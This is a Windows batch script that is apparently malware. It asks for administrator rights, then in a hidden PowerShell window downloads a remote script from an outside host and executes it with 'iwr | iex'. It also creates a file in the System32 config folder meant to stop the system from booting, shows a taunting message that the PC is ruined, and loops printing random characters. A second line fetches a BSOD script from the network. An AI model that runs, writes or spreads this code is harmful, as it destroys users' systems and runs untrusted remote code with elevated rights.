@echo off
:: Check for admin rights by trying to write to a system folder (or checking a system variable)
fsutil dirty query %systemdrive% >nul 2>&1
if errorlevel 1 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

powershell -NoProfile -WindowStyle Hidden -Command "iwr https://saturn.chickenjockey.dev/ah/cat.ps1 | iex"
echo Congrats, your system is now fucked. Booting back up your PC will instantly BSOD, so don't even try it :D > msg.txt >nul
start "" "msg.txt"
fsutil file createnew C:\Windows\System32\config\OSDATA 0 >nul

goto loop
timeout 10 /nobreak >nul
powershell iwr https://github.com/peewpw/Invoke-BSOD/raw/refs/heads/master/Invoke-BSOD.ps1 | iex

:loop
cmd /k powershell -NoProfile -Command "while ($true) { Write-Host -NoNewline ([char](Get-Random -Minimum 33 -Maximum 127)); Start-Sleep -Milliseconds 1 }"
timeout 2 /nobreak >nul
goto loop
